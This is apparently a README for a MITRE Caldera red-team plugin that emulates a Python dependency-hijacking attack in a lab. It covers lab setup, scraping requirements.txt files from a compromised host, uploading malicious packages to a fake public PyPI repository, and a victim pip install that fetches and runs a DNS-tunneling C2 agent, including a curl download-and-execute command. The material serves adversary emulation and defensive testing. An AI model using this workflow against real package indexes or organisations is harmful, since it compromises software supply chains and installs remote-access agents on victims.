# Dependency Hijacking in Caldera
This repository implements a Caldera plugin to help perform a Python dependency hijacking  using MITRE Caldera. Tested with Caldera 3.0.0, but should also work with 3.1.0 and 2.9.0. Support not guaranteed for other Caldera versions.

## Infrastructure Setup
To see this plugin in action, you need several, preferably separate, machines. Virtual machines will do fine. This plugin was developed using CentOS 8 Stream VMs, but other setups should work fine. Domain names shown in each heading will identify each machine in our example setup.

### Caldera Server (caldera01.red)
Install and configure Caldera 3.1.0.

#### Python Repo Configuration
If using the plugin to automatically upload malicious packages, you need to configure ~/.pypirc for the user running Caldera server. An example is below. In this case, the PyPi repo parameter to be passed to Caldera later is ```pypiext01```.

~/.pypirc:
```
[distutils]
index-servers =
  pypiext01

[pypiext01]
repository: http://pypiext01.ext:8080
username: bogus
password: bogus
```


#### If using DNS tunneling Sandcat
A Sandcat agent communicating via DNS C2 is the default final payload developed to the victim of the dependency hijacking attack. If you do not plan on replacing this, you will need to make some changes to the default Caldera install.

##### Checking out the right Sandcat and Gocat versions
Do not use the default versions of Sandcat and Gocat. Instead, checkout the latest master of the plugins/sandcat and plugins/sandcat/gocat submodules. DNS tunneling in Sandcat as of time of (05-06-2021) is a work-in-progress, hence why not the default Sandcat and Gocat commits in Caldera do not suffice.

If the latest commits do not work, b817047 of Sandcat and f6c9ba5 of Gocat worked at time of writing. On those particular commits, though, do NOT change app.contact.dns.domain in conf/local.yml unless you also change the BASE_DOMAIN variable in plugins/sandcat/gocat-extensions/contact/dns_tunneling.go. In the commit listed, the DNS domain is hardcoded in dns_tunneling.go to mycaldera.caldera; a mismatch will cause the agent to crash. This issue appears to be fixed in later commits.

##### Environment and Dependency Setup
Make sure the GO111MODULE environment variable is set to ```auto``` when running Caldera, or Caldera may mistakenly believe it doens't have the dependencies installed required to build Sandcat's DNS tunneling extension. After making sure GO111MODULE is set correctly (such as by adding ```export GO111MODULE=auto``` to the user's .bashrc and relogging), run:
```
go get github.com/miekg/dns
```
in a directory outside of a Go module (Caldera's home directory should work fine) to install Sandcat's DNS tunneling Go dependencies.


##### Testing the DNS Tunneling Agent
It is recommended to ensure DNS tunneling works by trying to run a DNS agent on the Caldera server. Start up Caldera server. The commands to deploy a Sandcat DNS tunneling agent (since it's not yet automatically provided in the Agents UI) are below. Replace http_server with your Caldera server's HTTP contact and dns_server with your Caldera server's DNS socket.
```
http_server="http://caldera01.red:8888"
dns_server="caldera01.red:8853"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:dns_tunneling" $http_server/file/download > sandcat_dns
chmod +x sandcat_dns
./sandcat_dns -c2 DnsTunneling -server $dns_server -v
```

### Target Victim Machine (vulnerable01.blu)
Setup a VM to serve as the victim machine. On the user that you plan to exploit, setup pip.conf to point to your simulated "public" PyPi repo and simulated "internal" PyPi repos. This file is usually at ~/.config/pip/pip.conf. An example is below. This is the vulnerability we will exploit.

~/.config/pip.conf: 
```
[global]
extra-index-url = http://pypiext01.ext:8080/simple/
                  http://pypiblu01.blu:8080/simple/
trusted-host = pypiext01.ext
               pypiblu01.blu
```

### (Optional) Victim Machine for Dependency Name Scraping (compromised01.blu)
This plugin comes with abilities to scrape a machine for the names of potential target packages. To see it in use, setup a VM and install a Caldera agent on it. Drop Python requirements.txt files in any agent-readable location on the machine containing the name of a simulated "internal" package (i.e., not matching the name of any real package on PyPi).

### Python Repository Servers (pypiblu01.blu and pypiext01.ext)
pypiblu01.blu refers to the simulated "internal" victim-controlled PyPi repo. pypiext01.ext refers to the simulated "public" attacker-writable PyPi repo.

We used https://pypi.org/project/pypiserver/ to run our Python repositories when developing this plugin. Configuring authentication is not necessary.

#### Uploading a Package to pypiblu01.blu
We need to upload the package we wish to hijack to pypiblu01.blu. This package doesn't need to have any actual code in it. The necesssary files are below.

setup.py​:
```
#!/usr/bin/env python3

from distutils.core import setup

setup(name='vulnerable-py',
      version='1.0',
      description='Vulnerable package to be targeted by hijacking',
      author='Dylan Cao',
      author_email='dvc8bg@virginia.edu',
      packages=['vulnerable-py'])
```

vulnerable-py/\_\_init\_\_.py:
```
pass
```

To upload a package, run ```python3 setup.py sdist upload -r pypiblu01```. Make sure ~/.pypirc is setup first so that pypiblu01 is a valid upload target.

## Executing an Attack
### Installing Agents
One or two agents need to be installed to execute the attack. A helper agent needs to be running on the Caldera server in its own group (e.g., give it the "helper" group). Optionally, an agent can be running on compromised01.blu to provide Caldera server with the names of packages to attack. We have tested the attack using the Sandcat agent.
### Configuring a Caldera Fact Source
![](https://i.imgur.com/lUeOdd4.png)

The attacking agent depends on some facts to be pre-configured. ```server.conf.exfil_dir``` should be set to the same value as ```exfil_dir``` in caldera/conf/local.yml. ```server.conf.caldera_dir``` should be set to the directory in which Caldera is installed. ```server.dh.pypi_repo_name``` should be set to the name of the "public" PyPi repo configured in ~/.pypirc. When running the attack adversary, make sure these custom facts are provided.

We describe two attacks, the "Automatic Route" and the "Manual Route". The "Automatic Route" describes the process by which an already compromised machine provides package names to Caldera server for exploitation. The "Manual Route" describes the process by which the attacker manually inputs package names, such as those obtained from publicly available sources like GitHub, rather than relying on an already compromised machine.

### ("Automatic Route", Optional) Cleanup old attack files
If you plan on automtaically gathering requirements.txt files, you may choose to cleanup the old ones first. There is a Collection ability named "Eliminate old "requirements_files.txt" that can do this. Run it on the attack helper agent. Be sure to provide the proper ```server.conf.exfil_dir``` fact.

### ("Automatic" Route) Gather requirements.txt from compromised01.blu
Run the "Gather requirements.txt" operation against the agent on compromised01.blu. This will run an ability that scrapes the machine for requirements.txt files and uploads them to Caldera server for later explotiation.

### ("Manual" Route) Input package names
Create a file named ```aggregated_requirements.txt``` at ```{exfil_dir}```, where ```{exfil_dir}``` is the variable in Caldera's local.yml config file. Input target package names in that file, one per line. For example, the file
```
vulnerable-py
foobar-py
```
will cause the attack to target those two packages if possible.

### ("Automatic" Route) Execute the attack
Run the Caldera operation with adversary "Execute dependency hijacking attack (automatic requirements)" on the attack helper agent. ***Make sure the configuration fact source you created earlier is provided to this operation.*** Malicious packages will then be uploaded to the designated PyPi server.

### ("Manual" Route) Execute the attack
Run the Caldera operation with adversary "Execute dependency hijacking attack (manual requirements)" on the attack helper agent. ***Make sure the configuration fact source you created earlier is provided to this operation.*** Malicious packages will then be uploaded to the designated PyPi server.

### Results
On the target victim machine (vulnerable01.blu), try to pip install the targeted package. If everything worked, a Sandcat DNS tunneling agent should now be running on vulnerable01.blu--check your Caldera server UI to confirm. The attack has succeeded!
```pip3 install --user vulnerable-py```

## Development
This plugin provides 4 abilities, 4 payloads, and 3 adversaries.

### Collection Abilities

#### 0cd957af-5f15-44fe-95d2-96546a7c5a93 - Eliminate old requirements\_files.txt
Cleans up old dependency hijacking attack related files on an attack helper agent.

#### 8da17889-80d9-4ef1-aa7c-5f28e5a3bf65.yml - Gather requirements.txt files
Uploads a file to Caldera server containing all Python requirements on this machine.

#### c623fb22-808a-4b2b-a193-64f2307568c9 - Aggregate requirements.txt files on control server
Aggregate flies uploaded by the previous ability into one file for executing the dependency hijacking attack.

### Initial-Access Abilities
#### 1a05db07-8fb0-4ea1-970c-f51cf8ce7e94 - Dependency hijacking attack
Execute the attack using aggregated_requirements.txt file manually provided or created by ability c623fb.

### Adversaries
#### 2237f581-9e43-46f4-90be-60eba71bb8ce.yml - Dependency hijacking attack (automatic requirements)
Aggregates requirements.txt files on control server and executes the attack. Assumes requirements.txt files have already been uploaded.

#### 49169bfe-8f15-406a-a1ae-6f8f91c7c793 - Dependency hijacking attack (manual requirements)
Does NOT create aggregated_requirements.txt. Assumes it already exists instead.

#### a380a9c6-4cc9-4770-bee8-3734a3457861 - Gather requirements.txt
Scrapes Python requirements.txt files from machines and uploads them to Caldera server.

### Payloads
Payloads used by the abilities in this plugin are in the payloads server. For binary payloads, the corresponding source code is in the payloads-src folder. Most or all of these payloads and their abilities only work on Linux machines for now.

#### attack\_builder.py
Executes the dependency hijacking attack.

#### requirements\_aggregator.py
Decrypts and aggregated exfiltrated requirements_files.txt to use with attack_builder.py

#### malicious-template.tar.gz and malicious-template
Python package template. Source is in payloads-src/malicious-template. To change the payload delivered to the victim by the malicious package, change the os.system and os.execl lines to download and execute a different payload from Caldera server.

#### requirements\_scraper.exe and requirements\_scraper.c
C program that finds requirements.txt files on a machine and combines them into one.
